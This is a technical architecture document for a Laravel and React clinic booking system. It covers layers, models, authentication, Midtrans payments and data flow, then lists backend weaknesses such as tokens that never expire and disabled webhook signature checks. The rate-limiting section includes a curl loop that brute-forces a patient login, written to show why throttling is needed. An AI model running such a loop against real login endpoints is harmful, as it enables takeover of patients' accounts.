# 🏗️ Technical Architecture — Booking Clinic Aura

> **Complete technical documentation** of Backend (Laravel) and Frontend (React) architecture with detailed pain points and realistic bugs

---

## 📑 Table of Contents

1. [Backend Architecture (Laravel)](#backend-architecture-laravel)
2. [Frontend Architecture (React)](#frontend-architecture-react)
3. [Data Flow & Integration](#data-flow--integration)
4. [Backend Pain Points](#backend-pain-points-5)
5. [Frontend Pain Points](#frontend-pain-points-5)
6. [Backend Bugs & Issues](#backend-bugs--issues-5)
7. [Frontend Bugs & Issues](#frontend-bugs--issues-5)

---

## 🔧 Backend Architecture (Laravel)

### Overview

```
┌─────────────────────────────────────────────────────────────────┐
│                     LARAVEL BACKEND API                         │
│                   (Unified Monolithic)                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  📋 Routes (api.php)                                            │
│  ├─ /auth/* (login, register, logout, me)                      │
│  ├─ /doctors/* (CRUD + schedules)                              │
│  ├─ /bookings/* (CRUD + status update)                         │
│  ├─ /orders/* (CRUD + status)                                  │
│  ├─ /payments/* (initiate + webhook)                           │
│  ├─ /medical-records/* (CRUD + prescriptions)                  │
│  ├─ /services/* (CRUD)                                         │
│  ├─ /products/* (CRUD + stock)                                 │
│  ├─ /notifications/* (get, mark as read)                       │
│  └─ /admin/* (dashboard, stats)                                │
│                                                                 │
│  🎮 Controllers (Http/Controllers/)                             │
│  ├─ Receive HTTP request                                       │
│  ├─ Validate request via FormRequest                           │
│  ├─ Call service method                                        │
│  └─ Return ApiResponseTrait formatted response                 │
│                                                                 │
│  💼 Services (Services/)                                        │
│  ├─ Business logic & domain rules                              │
│  ├─ Transaction management                                     │
│  ├─ Event dispatching                                          │
│  ├─ Call repository methods                                    │
│  └─ Throw exceptions for validation                            │
│                                                                 │
│  📦 Repositories (Repositories/)                                │
│  ├─ Data access layer                                          │
│  ├─ Query building                                             │
│  ├─ Relationship loading                                       │
│  ├─ Return Eloquent models                                     │
│  └─ No business logic                                          │
│                                                                 │
│  🗄️ Models (Models/)                                           │
│  ├─ Eloquent ORM with custom primaryKey                        │
│  ├─ Relationships defined (hasMany, belongsTo, etc)           │
│  ├─ Soft deletes for audit trail                              │
│  └─ Fillable attributes + casts                               │
│                                                                 │
│  🗄️ MySQL Database (Single Unified DB)                         │
│  ├─ 16 main tables                                             │
│  ├─ Foreign key constraints                                    │
│  ├─ Indexes on frequently queried columns                      │
│  └─ Timestamps (created_at, updated_at)                       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 3-Tier Architecture Pattern

```
REQUEST → CONTROLLER → SERVICE → REPOSITORY → DATABASE → MODEL
  ↓          ↓           ↓           ↓          ↓         ↓
HTTP     Validates    Business     Query       CRUD    Eloquent
Request  FormRequest  Logic        Builder     OPS     Relationships
         + Auth                    + Eager
         + Role                    Loading
         Middleware

RESPONSE → Controller → Service → Repository → Database
   ↑          ↓           ↑          ↑
ApiResponse  Format &   Result of  Result of
Trait        Return     Operation   Query
```

### Key Components

#### 1. **Models** (16 Total)
```
📊 Core Models:
├─ User (user_id, email, password, role, status)
├─ Patient (patient_id, user_id, DOB, gender, address, blood_type)
├─ Doctor (doctor_id, user_id, specialization_id, is_available, is_active)
├─ DoctorSchedule (schedule_id, doctor_id, day_of_week, start_time, end_time, is_active)
├─ Specialization (specialization_id, name)
│
📅 Booking & Medical:
├─ Booking (booking_id, patient_id, doctor_id, schedule_id, booked_date, status)
├─ MedicalRecord (record_id, booking_id, patient_id, doctor_id, diagnosis, notes)
├─ Prescription (prescription_id, record_id, description, qty)
│
💳 E-Commerce:
├─ Order (order_id, patient_id_snapshot, total_amount, status)
├─ OrderItem (order_item_id, order_id, product_id_snapshot, qty, unit_price_snapshot)
├─ Payment (payment_id, order_id, status, midtrans_id, amount)
├─ Product (product_id, name, SKU, price, stock_qty, category_id)
├─ ProductCategory (category_id, name)
├─ StockLog (stock_log_id, product_id, change_qty, reason)
│
🔔 Notifications:
└─ Notification (notification_id, user_id, type, data, read_at)

KEY PROPERTIES:
• Custom primaryKey (not 'id')
  - User: 'user_id'
  - Patient: 'patient_id'
  - Doctor: 'doctor_id'
  - Booking: 'booking_id'
  - etc.

• Relationships:
  - User hasOne Patient, hasOne Doctor
  - Doctor hasMany Schedule, hasMany Booking
  - Booking belongsTo Doctor, Patient, Schedule
  - Patient hasMany Booking, hasMany Order
  - Order hasMany OrderItem, hasOne Payment
  - MedicalRecord hasMany Prescription

• Special Patterns:
  - Soft deletes (SoftDeletes trait)
  - Timestamps (created_at, updated_at)
  - Snapshot pattern for Order/OrderItem (immutable copies)
```

#### 2. **Repositories** (15 Total)
```
Base Pattern:
┌──────────────────────────────┐
│ BaseRepository               │
│ ──────────────────────────── │
│ __construct($model)          │
│ find($id)                    │
│ findOrFail($id)              │
│ all()                        │
│ create(array)                │
│ update($id, array)           │
│ delete($id)                  │
│ paginate($perPage)           │
│ getQuery()                   │
└──────────────────────────────┘
           ↑
  Extended by:
  ├─ UserRepository
  ├─ PatientRepository
  ├─ DoctorRepository
  ├─ ScheduleRepository
  ├─ BookingRepository
  ├─ MedicalRepository
  ├─ ServiceRepository
  ├─ OrderRepository
  ├─ OrderItemRepository
  ├─ PaymentRepository
  ├─ ProductRepository
  ├─ ProductCategoryRepository
  └─ StockLogRepository

Special Methods (per repository):
• DoctorRepository:
  ├─ allWithRelations()
  ├─ findAvailable()
  ├─ findBySpecialization($specId)
  └─ findWithSchedules($id)

• BookingRepository:
  ├─ findByPatient($patientId)
  ├─ findByDoctor($doctorId)
  └─ allWithRelations()

• ScheduleRepository:
  ├─ findByDoctor($doctorId)
  ├─ findActiveByDoctor($doctorId)
  └─ findConflictingSchedules(...)

• OrderRepository:
  ├─ findByPatient($patientId)
  └─ findByOrderNumber($orderNumber)

• ProductRepository:
  ├─ findBySKU($sku)
  └─ findActive()
```

#### 3. **Services** (11 Total)
```
Service Layer:
Implements business logic & orchestration

┌─────────────────────────────────────────────┐
│ BaseService (Abstract)                       │
│ ├─ __construct(BaseRepository)               │
│ ├─ find($id)                                │
│ ├─ findOrFail($id)                          │
│ ├─ all()                                    │
│ ├─ create(array)                            │
│ ├─ update($id, array)                       │
│ └─ delete($id)                              │
└─────────────────────────────────────────────┘
             ↑
        Extended by:

AuthService (No extend)
├─ register(array) → Transaction (User + Patient)
├─ login(array) → Token generation
├─ logout(User)
└─ me(User)

BookingService
├─ getAllWithRelations(User) → Role-based filtering
├─ createBooking(array) → Transaction + slot locking + event
├─ updateStatus(int, string)
└─ delete(int)

DoctorService
├─ getAllWithRelations()
├─ getAvailable()
├─ createDoctor(array) → Validate user role
├─ updateDoctor(int, array)
└─ toggleAvailability(int)

ScheduleService
├─ getByDoctor(int)
├─ addSchedule(int, array) → Validate no time conflict
├─ updateSchedule(int, int, array)
└─ validateNoConflict(...)

MedicalService
├─ getMedicalRecords(...)
├─ createMedicalRecord(array)
├─ addPrescriptions(int, array)
└─ replacePrescriptions(int, array)

OrderService
├─ getAllOrders(User) → Role-based filtering
├─ createOrder(array)
├─ updateStatus(int, string)
└─ cancel(int)

PaymentService
├─ initiatePayment(Order) → Midtrans Snap
├─ handleWebhook(array) → Update order + payment
└─ getPaymentByOrder(int)

ServiceService, ProductService, etc.
├─ CRUD operations
├─ Validation (duplicate checks)
└─ Toggle active/inactive
```

#### 4. **Controllers** (12 Total)
```
HTTP Request → Controller → Validation → Service Call → Response

Example: BookingController::store()

public function store(StoreBookingRequest $request)
{
    try {
        // $request is validated by FormRequest
        // FormRequest::authorize() checks auth:sanctum
        // FormRequest::rules() validates data
        
        $booking = $this->bookingService->createBooking(
            $request->validated()
        );
        
        return $this->successResponse($booking, 'Booking berhasil dibuat');
    } catch (ValidationException $e) {
        return $this->errorResponse($e->errors(), 422);
    } catch (\Throwable $e) {
        return $this->errorResponse('Gagal membuat booking', 500);
    }
}

Common Pattern:
1. FormRequest validates + checks auth + checks role
2. Service layer handles business logic
3. Controller catches exceptions
4. ApiResponseTrait returns consistent JSON
```

#### 5. **FormRequest Validation**
```
Multiple layers:

File: App/Http/Requests/Booking/StoreBookingRequest.php

public function authorize(): bool
{
    // Middleware auth:sanctum ensures user exists
    return true;
}

public function rules(): array
{
    return [
        'service_id'  => 'required|exists:services,service_id',
        'doctor_id'   => 'required|exists:doctors,doctor_id',
        'booked_date' => 'required|date|after:today',
        'booked_time' => 'required|date_format:H:i',
    ];
}

public function messages(): array
{
    return [
        'booked_date.after' => 'Tanggal tidak boleh hari ini atau hari lalu',
    ];
}

// If validation fails:
// Throws ValidationException → Controller catches → errorResponse(422)
// Frontend extracts errors from response['data']
```

#### 6. **Event System**
```
Current Implementation:

Event: BookingCreated
    class BookingCreated
    {
        public function __construct(public Booking $booking) {}
    }

Listener: SendBookingNotificationListener
    - Should send notification to patient
    - Currently minimal implementation
    - Registered in AppServiceProvider boot()

Flow:
1. BookingService::createBooking() fires event
    Event::dispatch(new BookingCreated($booking));
2. Laravel routes event → SendBookingNotificationListener
3. Listener handles notification (DB, Email, SMS)

NOTE: This infrastructure is in place but not fully utilized.
      Event listeners are stubs.
```

#### 7. **Payment Integration**
```
Midtrans Gateway (via PaymentService):

1. Frontend calls /payments/initiate
   └─ OrderId + Amount

2. PaymentService::initiatePayment()
   └─ Create Snap token via Midtrans API
   └─ Return redirect URL

3. Frontend redirects to Midtrans
   └─ User selects payment method:
      ├─ QRIS (scan)
      ├─ GoPay (OTP)
      ├─ OVO (OTP)
      ├─ DANA (OTP)
      ├─ Bank Transfer (BCA, Mandiri, BNI)
      └─ Credit Card

4. Payment completed → Midtrans webhook to backend
   └─ POST /payments/webhook
   └─ PaymentService::handleWebhook()
   └─ Verify signature (disabled in current implementation)
   └─ Update payment status + order status
   └─ Idempotent (prevents duplicate processing)

5. Frontend polls payment status OR uses webhook notification

DATABASE IMPACT:
  Payment table updated → Order status updated → Booking confirmed
  All via transaction to ensure ACID
```

#### 8. **Authentication (Sanctum)**
```
Token-Based Auth:

1. Register:
   POST /auth/register
   Body: { full_name, email, password, date_of_birth, gender, ... }
   
   → AuthService::register()
     ├─ Create User record
     ├─ Create Patient profile (if role=patient)
     ├─ Generate token via createToken('auth_token')
     └─ Return user + plainTextToken

2. Login:
   POST /auth/login
   Body: { email, password }
   
   → AuthService::login()
     ├─ Find user by email
     ├─ Verify password
     ├─ Update last_login timestamp
     ├─ Generate token
     └─ Return user + token

3. Token Storage (Frontend):
   - localStorage.setItem('aura_token', token)
   - Sent in every request: Authorization: Bearer {token}

4. Middleware:
   - auth:sanctum → Validates token, populates Auth::user()
   - role:admin, role:doctor, role:patient → Checks user role
   - Can combine: auth:sanctum, role:admin

5. Logout:
   POST /auth/logout
   → Revokes current token (Sanctum)
   → Frontend clears localStorage

TOKEN PROPERTIES:
  ├─ No expiry time (security issue)
  ├─ Stored in plaintext in DB (Laravel manages)
  ├─ Frontend refreshes manually (no auto-rotation)
  └─ Multiple tokens possible per user (can have active sessions)
```

#### 9. **Database Transactions**
```
Race Condition Prevention (Booking):

BookingService::createBooking():
    return DB::transaction(function () use ($data) {
        // 1. Resolve patient
        $patient = User::findOrFail(Auth::id())->patient;
        
        // 2. Resolve schedule + check availability
        $schedule = $this->scheduleRepository->findOrFail(...);
        
        // 3. LOCK FOR UPDATE — prevent concurrent bookings
        $lockedSlot = DoctorSchedule::query()
            ->where('schedule_id', $schedule->schedule_id)
            ->lockForUpdate()
            ->first();
        
        // 4. Count existing bookings in this slot
        $existingCount = Booking::where(...)
            ->whereDate('booked_date', $bookedDate)
            ->whereTime('booked_time', $bookedTime)
            ->count();
        
        if ($existingCount >= $maxSlots) {
            throw ValidationException::withMessages([...]);
        }
        
        // 5. Create booking (atomically with lock)
        $booking = $this->bookingRepository->create([...]);
        
        // 6. Create order (if needed)
        // 7. Dispatch event
        
        return $booking;
    });

BENEFIT: Prevents double-booking even under concurrent requests
```

---

## ⚛️ Frontend Architecture (React)

### Overview

```
┌────────────────────────────────────────────────────────────────┐
│                    REACT + VITE FRONTEND                       │
│              (Client-Side Routing + State Management)          │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  📄 Pages (src/pages/)                                         │
│  ├─ Public: HomePage, LoginPage, RegisterPage, AboutPage     │
│  ├─ Patient: Dashboard, Booking, MyBookings, Orders          │
│  ├─ Doctor: Dashboard, Records                               │
│  ├─ Admin: Dashboard, Doctors, Services, Products, Bookings  │
│  └─ PaymentResultPage (public, handles Midtrans callback)   │
│                                                                │
│  🧩 Components (src/components/)                              │
│  ├─ Layout: MainLayout, Navbar, Sidebar, UserSection        │
│  ├─ Admin Forms: DoctorForm, ServiceForm, ProductForm       │
│  ├─ UI: Modal, DataTable, StatusBadge, LoadingSpinner      │
│  ├─ Booking: BookingCard, BookingList, StepTracker         │
│  └─ Shared: ProtectedRoute, Error boundaries               │
│                                                                │
│  🎮 Contexts (src/contexts/)                                  │
│  ├─ AuthContext (user, token, login, logout, getMe)        │
│  ├─ BookingContext (bookings, createBooking, updateStatus) │
│  └─ CartContext (cart items, addToCart, checkout)          │
│                                                                │
│  🔌 API Layer (src/api/)                                      │
│  ├─ axios.js (config + interceptors)                        │
│  ├─ authApi.js (login, register, logout, me, refresh)     │
│  ├─ bookingApi.js (CRUD operations)                         │
│  ├─ orderApi.js (CRUD + filtering)                          │
│  ├─ doctorApi.js (CRUD + schedules)                         │
│  ├─ serviceApi.js (CRUD)                                    │
│  ├─ paymentApi.js (initiate + check status)               │
│  ├─ productApi.js (CRUD + stock)                            │
│  ├─ adminApi.js (dashboard, stats)                          │
│  └─ notificationApi.js (get, mark as read)                 │
│                                                                │
│  🛣️ Router (src/route/)                                       │
│  ├─ Route definitions (public + protected)                   │
│  ├─ ProtectedRoute HOC (checks auth + role)                │
│  ├─ Lazy-loaded pages                                       │
│  └─ Location state for post-login redirect                 │
│                                                                │
│  🎨 Styles (Tailwind CSS)                                     │
│  ├─ No CSS files (utility-first via @apply)                │
│  ├─ Global styles (src/index.css, src/App.css)             │
│  └─ Vite build: @tailwindcss/vite plugin                   │
│                                                                │
│  📦 Dependencies                                              │
│  ├─ react@19.2.6                                            │
│  ├─ react-router-dom@7.16.0                                │
│  ├─ axios@1.16.1                                            │
│  └─ tailwindcss@4.3.0 (via Vite)                           │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

### Request-Response Cycle

```
COMPONENT → Context/State → API Call → Axios Interceptor → Backend

Example: Booking Creation

1. BookingPage (Component)
   ├─ User fills 4-step form
   ├─ Calls bookingContext.createBooking(data)
   └─ Sets loading = true

2. BookingContext (Context Provider)
   ├─ Calls bookingApi.createBooking(data)
   └─ Dispatches action to update state

3. bookingApi.createBooking()
   ├─ Makes POST /bookings with validated data
   └─ Axios interceptor adds Authorization header

4. Axios Interceptor (axios.js)
   ├─ Request: Adds Bearer token
   ├─ Response: 
   │  ├─ If 200: Returns data
   │  ├─ If 401: Attempts token refresh
   │  └─ If 422: Extracts validation errors
   └─ If 500: Shows generic error

5. Backend (Laravel)
   ├─ Controllers::store()
   ├─ Validates via FormRequest
   ├─ Calls BookingService::createBooking()
   └─ Returns ApiResponse JSON

6. Frontend (Response Handler)
   ├─ Extracts response.data
   ├─ Updates BookingContext state
   ├─ Shows success toast
   ├─ Redirects to MyBookings
   └─ Sets loading = false

COMPONENT → Page updates → Re-renders with new data
```

### State Management Pattern

```
Context API (No Redux):

AuthContext
├─ State:
│  ├─ user (null | {user_id, email, role, ...})
│  ├─ token (null | string)
│  ├─ loading (boolean)
│  └─ error (null | string)
│
├─ Functions:
│  ├─ login(email, password) → authApi.login() → setToken + setUser
│  ├─ register(data) → authApi.register() → setToken + setUser
│  ├─ logout() → authApi.logout() → clearToken + clearUser
│  ├─ getMe() → authApi.getMe() → setUser (for session recovery)
│  └─ checkUnauthorized() → Listen for 403 → logout()
│
└─ Persistence:
   └─ localStorage: aura_token, aura_user

BookingContext
├─ State:
│  ├─ bookings (array)
│  ├─ activeBooking (null | {booking_id, ...})
│  ├─ loading (boolean)
│  └─ error (null | {field: [message]})
│
├─ Functions:
│  ├─ fetchBookings() → bookingApi.getBookings()
│  ├─ createBooking(data) → bookingApi.createBooking()
│  ├─ updateStatus(bookingId, status) → bookingApi.updateStatus()
│  └─ extractValidationErrors(response) → parse 422 response
│
└─ No persistence (fetch from API)

CartContext
├─ State:
│  ├─ items (array)
│  ├─ total (number)
│  └─ loading (boolean)
│
├─ Functions:
│  ├─ addToCart(product) → items.push()
│  ├─ removeFromCart(productId) → items.filter()
│  ├─ checkout() → orderApi.createOrder()
│  └─ clear() → items = []
│
└─ Persistence:
   └─ localStorage: aura_cart
```

### API Interceptor Pattern

```
Axios Interceptor (Token Rotation):

REQUEST INTERCEPTOR:
├─ Add Authorization: Bearer {token}
└─ Pass config

RESPONSE INTERCEPTOR:
├─ Success (2xx):
│  └─ Return response
│
├─ Error 401 (Unauthorized):
│  ├─ If isRefreshing == true:
│  │  └─ Queue request, wait for token refresh
│  │
│  └─ If isRefreshing == false:
│     ├─ Set isRefreshing = true
│     ├─ Call POST /auth/refresh
│     ├─ Update new token in localStorage
│     ├─ Process queued requests with new token
│     ├─ Set isRefreshing = false
│     └─ Retry original request
│
├─ Error 403 (Forbidden):
│  └─ Call clearAuth() → logout()
│
├─ Error 422 (Validation):
│  └─ Extract field errors from response['data']
│
└─ Error 5xx (Server):
   └─ Generic error message

BENEFIT: Token rotation without user interaction
         Prevents "token expired" errors mid-request
         Handles race conditions (multiple requests at once)
```

### Protected Route Pattern

```
ProtectedRoute HOC:

<ProtectedRoute
  allowedRoles={['patient', 'doctor']}
  element={<BookingPage />}
/>

Checks:
1. Is user authenticated?
   ├─ If NO: Redirect to /login with location state
   │  (After login, redirects back to original page)
   └─ If YES: Continue

2. Does user role match?
   ├─ If NO: Redirect to /not-authorized
   └─ If YES: Render element

Usage:
├─ Patient: /patient/dashboard, /patient/booking, /patient/my-bookings
├─ Doctor: /doctor/dashboard, /doctor/records
├─ Admin: /admin/dashboard, /admin/doctors, /admin/services
└─ Public: /login, /register, /about, /
```

### Form Handling Pattern

```
Multi-Step Form (Booking):

Step 1: Select Service
├─ <input/select/checkbox>
├─ onChange → setFormData({...prev, service_id})
└─ Validation: required + exists

Step 2: Select Doctor
├─ fetch available doctors based on service_id
├─ <select> with doctor list
├─ onChange → setFormData({...prev, doctor_id})
└─ Validation: required + exists

Step 3: Pick Date & Time
├─ <Calendar> component (14-day picker)
├─ fetch taken dates for selected doctor
├─ show available slots
├─ onClick → setFormData({...prev, booked_date, booked_time})
└─ Validation: required + date + time format

Step 4: Confirm & Pay
├─ Display order summary
├─ Choose payment method:
│  ├─ Pay Now → redirect to Midtrans
│  └─ Pay Later → create order + redirect
├─ onClick → bookingApi.createBooking(formData)
└─ Response validation → show errors or success

Error Handling:
├─ Client-side:
│  └─ Required fields, format validation
│
├─ Server-side (422 response):
│  └─ Extract errors → display under field
│
└─ Server-side (5xx):
   └─ Generic "gagal membuat booking" message

Touch Pattern (Mobile):
├─ onBlur → mark field as touched
├─ Show error only if touched + invalid
└─ Prevents error spam while user typing
```

### Payment Flow

```
PaymentResultPage (Public):

1. Midtrans redirects to /payment/result?order_id=X&status=Y

2. Component:
   ├─ Parse query parameters
   ├─ Call paymentApi.getPaymentByOrder(orderId)
   ├─ Check payment status from backend

3. Display based on status:
   ├─ Success:
   │  ├─ ✅ Icon + green styling
   │  ├─ "Pembayaran Berhasil"
   │  ├─ Order details
   │  └─ Link to MyBookings
   │
   ├─ Pending:
   │  ├─ ⏳ Icon + yellow styling
   │  ├─ "Pembayaran Diproses"
   │  ├─ "Tunggu konfirmasi dari bank"
   │  └─ Link to MyOrders
   │
   └─ Failed/Error:
      ├─ ❌ Icon + red styling
      ├─ "Pembayaran Gagal"
      ├─ Error reason from response
      └─ Link to rebook/try again

NOTE: Public page (not protected)
      Can be accessed without login
      Shows payment status to customer
```

---

## 🔄 Data Flow & Integration

### Complete End-to-End Flow (Booking)

```
1. FRONTEND: Patient fills booking form
   ├─ Step 1: Select Service
   │  └─ bookingApi.getServices()
   │
   ├─ Step 2: Select Doctor
   │  └─ doctorApi.getAvailableDoctors(serviceId)
   │
   ├─ Step 3: Pick Date & Time
   │  └─ scheduleApi.getTakenDates(doctorId, scheduleId)
   │
   └─ Step 4: Choose Payment
      └─ ready to submit

2. FRONTEND: Submit booking
   └─ bookingApi.createBooking({
        service_id,
        doctor_id,
        schedule_id,
        booked_date,
        booked_time,
        payment_method: 'pay_now' | 'pay_later'
      })

3. AXIOS INTERCEPTOR
   ├─ Add Authorization: Bearer {token}
   └─ POST /api/bookings

4. BACKEND CONTROLLER
   └─ BookingController::store(StoreBookingRequest $request)
      ├─ Validates request via FormRequest
      ├─ Calls BookingService::createBooking()
      └─ Returns ApiResponse

5. BACKEND SERVICE
   └─ BookingService::createBooking()
      ├─ DB::transaction() {
      │   ├─ Resolve patient from Auth user
      │   ├─ Find schedule
      │   ├─ lockForUpdate() on schedule
      │   ├─ Count existing bookings
      │   ├─ If slot full: throw ValidationException
      │   ├─ Create booking
      │   ├─ Create order (if needed)
      │   ├─ Dispatch BookingCreated event
      │   └─ Return booking
      │ }
      └─ Event → SendBookingNotificationListener

6. DATABASE
   ├─ bookings (insert)
   ├─ orders (insert)
   ├─ notifications (insert via listener)
   └─ All within transaction

7. BACKEND RESPONSE
   └─ {
        success: true,
        data: {
          booking_id,
          patient_id,
          doctor_id,
          booked_date,
          status,
          ...
        },
        message: "Booking berhasil dibuat"
      }

8. FRONTEND RESPONSE HANDLER
   ├─ Update BookingContext state
   ├─ If payment_method == 'pay_now':
   │  └─ Call paymentApi.initiatePayment(orderId)
   │     ├─ Backend: PaymentService::initiatePayment()
   │     ├─ Creates Snap token via Midtrans API
   │     └─ Returns redirect URL
   │     └─ Frontend redirects to Midtrans
   │
   └─ Else:
      └─ Show success message
      └─ Redirect to MyBookings

9. PAYMENT (If Pay Now)
   ├─ Midtrans payment gateway
   ├─ User selects method: QRIS, GoPay, OVO, etc
   ├─ Completes payment
   ├─ Midtrans sends webhook to backend
   │  └─ POST /api/payments/webhook
   │  └─ PaymentService::handleWebhook()
   │  └─ Updates payment status + order status
   │  └─ DB::transaction ensures consistency
   │
   └─ Frontend redirects to /payment/result
      └─ Shows success/pending/error status

10. DATABASE (After Payment)
    ├─ payments (status = 'success')
    ├─ orders (status = 'paid')
    └─ bookings (status = 'confirmed')
```

### API Response Format

```
SUCCESS (200):
{
  "success": true,
  "data": {
    "booking_id": 1,
    "patient_id": 100,
    "doctor_id": 50,
    "booked_date": "2026-06-08",
    "status": "confirmed",
    "created_at": "2026-06-06T10:30:00Z"
  },
  "message": "Booking berhasil dibuat"
}

VALIDATION ERROR (422):
{
  "success": false,
  "data": {
    "service_id": ["The service_id field is required"],
    "doctor_id": ["The doctor_id field must exist"],
    "booked_date": ["The booked_date must be after today"]
  },
  "message": "Validation errors"
}

SERVER ERROR (500):
{
  "success": false,
  "data": null,
  "message": "Gagal membuat booking"
}

UNAUTHORIZED (401):
{
  "success": false,
  "data": null,
  "message": "Unauthenticated"
}

FORBIDDEN (403):
{
  "success": false,
  "data": null,
  "message": "Unauthorized"
}

Frontend extracts:
├─ response.success (boolean)
├─ response.data (payload)
├─ response.message (user message)
└─ 422 errors: response.data (field errors)
```

---

## ⚠️ Backend Pain Points (5)

### 1. **Manual Service Provider Binding (IoC Container Complexity)**

**Problem:**
```php
// AppServiceProvider.php — 250+ lines of manual binding

$this->app->singleton(
    BookingService::class,
    fn($app) =>
    new BookingService(
        $app->make(BookingRepository::class),
        $app->make(ScheduleRepository::class),
    )
);

// Repeated for every service...
// Total: 15 repositories × 1-2 lines = ~50+ lines binding code
```

**Why It Hurts:**
- ❌ Tedious to add new services (must remember all dependencies)
- ❌ Easy to miss dependencies (causes runtime errors)
- ❌ Cannot use Laravel's auto-discovery
- ❌ Difficult to refactor (change dependency = update 2 places)
- ❌ No IDE support for discovering services
- ❌ Boilerplate makes AppServiceProvider hard to read

**Cost:**
- 30 mins per new service (write binding + test)
- 2-3 bugs per quarter from missing dependencies
- High onboarding friction for new developers

**Solution Options:**
```php
// Option 1: Auto-wire with constructor injection
// (Laravel can already do this if repositories have __construct)

// Option 2: Use service locator pattern
// class ServiceLocator {
//   public static function make($service) { ... }
// }

// Option 3: Use package like Autobinding
// composer require optional-dependency-binding
```

---

### 2. **Event Listener Stubs Not Implemented**

**Problem:**
```php
// Listeners/SendBookingNotificationListener.php

public function handle(BookingCreated $event)
{
    // Event fired but handler is EMPTY
    // Should send notification but doesn't
}

// Result: Event system is infrastructure but not functional
```

**Why It Hurts:**
- ❌ Booking notifications don't reach patient
- ❌ Doctor doesn't get notified of new booking
- ❌ Event infrastructure is wasted
- ❌ Frontend cannot show real-time notifications
- ❌ Patients unaware of booking confirmation
- ❌ Support gets calls: "Did my booking go through?"

**Cost:**
- 1-2 lost bookings per day (patients rebook thinking first failed)
- Support team workload +20%
- Negative user experience
- Revenue impact (bounce rate increases)

**Current State:**
```
Event fired → Listener invoked → Handler does nothing → Data lost
                                      ↓
                            Patient waits for notification...
                            (Never comes)
```

**Solution Needed:**
```php
// Implement handle():
public function handle(BookingCreated $event)
{
    // 1. Get patient user
    $patient = User::find($event->booking->patient->user_id);
    
    // 2. Store notification in DB
    $patient->notify(new BookingCreatedNotification($event->booking));
    
    // 3. (Optional) Send email/SMS
    // Mail::to($patient->email)->queue(new BookingConfirmation(...));
}
```

---

### 3. **No Token Expiry or Refresh Token Implementation**

**Problem:**
```php
// AppServiceProvider or AuthService

// Current: Tokens never expire
// Token is valid indefinitely

// Sanctum supports expiry but not used:
// 'expiration' => 525600, // 1 year in minutes (never set)

// Frontend has refresh mechanism but backend never expires tokens
```

**Why It Hurts:**
- ❌ Stolen token = permanent access (no time limit)
- ❌ If user account compromised, attacker has forever
- ❌ Cannot force logout globally (old tokens stay valid)
- ❌ Security audit will fail: "No token expiry configured"
- ❌ If password changed, old sessions still work
- ❌ Compliance issue (PCI-DSS, HIPAA require token expiry)

**Attack Scenario:**
```
1. Patient's token gets stolen (XSS attack)
2. Attacker keeps token
3. Token never expires
4. Attacker can:
   ├─ View patient's medical records
   ├─ Make fake bookings
   ├─ Purchase with their payment method
   └─ Access for months/years

5. Patient has no idea (token has no expiry)
```

**Current Frontend Workaround:**
```javascript
// Frontend tries to refresh but backend doesn't require it

api.interceptors.response.use(..., async (error) => {
  if (error.response?.status === 401) {
    // Attempt refresh
    const res = await api.post("/auth/refresh");
    const newToken = res.data.data.token;
    setToken(newToken);
  }
});

// But since tokens never expire on backend...
// This refresh is never triggered!
```

**Cost:**
- High security risk
- OWASP Top 10: A07:2021 Identification & Authentication Failures
- Future compliance issues

---

### 4. **Missing Rate Limiting & Brute Force Protection**

**Problem:**
```php
// routes/api.php

Route::post('/auth/login', [AuthController::class, 'login']);
// No rate limiting middleware

// Attacker can:
// ├─ Try 10,000 password guesses in 1 second
// ├─ Try all 10,000 email addresses
// └─ Use credentials from leaked databases (credential stuffing)
```

**Why It Hurts:**
- ❌ No protection against brute force attacks
- ❌ No protection against credential stuffing
- ❌ API can be overwhelmed (DoS)
- ❌ Patient accounts easily compromised
- ❌ No audit trail of failed attempts
- ❌ Server resources wasted on malicious requests

**Attack Example:**
```bash
# Attacker script
for i in {1..10000}; do
  curl -X POST http://localhost:8000/api/auth/login \
    -d "email=patient@clinic.id&password=attempt_$i"
done

# Server gets slammed with 10K requests
# Patient account brute-forced in seconds
```

**Laravel Solution (Easy):**
```php
// Middleware exists but not used

Route::post('/auth/login', [AuthController::class, 'login'])
    ->middleware('throttle:5,1'); // 5 attempts per 1 minute

Route::post('/auth/register', [AuthController::class, 'register'])
    ->middleware('throttle:3,1'); // 3 registrations per minute
```

**Cost:**
- Account takeovers
- Reputation damage
- Potential data breach

---

### 5. **Slot Locking + Double-Booking Still Vulnerable to Race Conditions**

**Problem:**
```php
// BookingService::createBooking()

return DB::transaction(function () use ($data) {
    // Lock acquired here
    $lockedSlot = DoctorSchedule::query()
        ->where('schedule_id', $schedule->schedule_id)
        ->lockForUpdate()
        ->first();
    
    // Count existing bookings
    $existingCount = Booking::where(...)
        ->whereDate('booked_date', $bookedDate)
        ->whereTime('booked_time', $bookedTime)
        ->count();
    
    // Check if slot full (assume max 1 per slot)
    if ($existingCount >= 1) {
        throw ValidationException::withMessages([...]);
    }
    
    // Create booking
    $booking = $this->bookingRepository->create([...]);
    
    return $booking;
    // Lock released here
});

// ISSUE: We lock the SCHEDULE, not the SLOT
// Multiple schedules might cover same time slot
// Example: 2 schedules for same doctor, 09:00-12:00
```

**Real Scenario:**
```
Doctor "Dr. Siti" has:
  Schedule 1 (schedule_id=1): Monday 09:00-12:00
  Schedule 2 (schedule_id=2): Monday 09:00-12:00
  (Maybe created by mistake, or overlapping)

Patient 1: Tries to book Monday 09:00 using Schedule 1
Patient 2: Tries to book Monday 09:00 using Schedule 2

Both transactions:
  ├─ Locks their respective schedule (1 and 2)
  ├─ No conflict because different schedules
  ├─ Both see existingCount = 0
  └─ Both create booking for same time slot

Result: DOUBLE-BOOKED (both got 09:00 on Monday)
```

**Why It Hurts:**
- ❌ System allows overbooking in edge cases
- ❌ Doctor scheduled for same time twice
- ❌ Patients miss appointments
- ❌ Clinic reputation damage
- ❌ Complex business logic not obvious from code

**Correct Fix:**
```php
// Lock by doctor + date + time, not just schedule

$lockedBooking = Booking::query()
    ->where('doctor_id', $doctor->doctor_id)
    ->whereDate('booked_date', $bookedDate)
    ->whereTime('booked_time', $bookedTime)
    ->lockForUpdate()
    ->first();

// OR: Create unique constraint
// ALTER TABLE bookings ADD UNIQUE(doctor_id, booked_date, booked_time);
```

**Cost:**
- 2-3 overbooking incidents per month
- Support team resolves conflicts manually
- Patient complaints
